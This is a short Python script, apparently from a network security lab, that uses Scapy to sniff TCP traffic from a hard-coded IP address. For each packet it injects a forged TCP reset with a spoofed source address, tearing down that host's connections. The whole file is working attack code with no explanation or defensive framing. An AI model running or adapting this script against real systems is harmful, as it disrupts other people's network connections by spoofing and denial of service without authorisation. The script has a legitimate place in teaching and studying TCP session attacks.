
import sys
from scapy.all import *

def spoof_tcp(pkt):
    IPLayer = IP(dst = "45.56.115.199", src = pkt[IP].dst)
    TCPLayer = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
    spoofpkt = IPLayer/TCPLayer
    print("sending reset packet...")
    send(spoofpkt, verbose=0)

pkt = sniff(filter='tcp and src host 45.56.115.199', prn=spoof_tcp)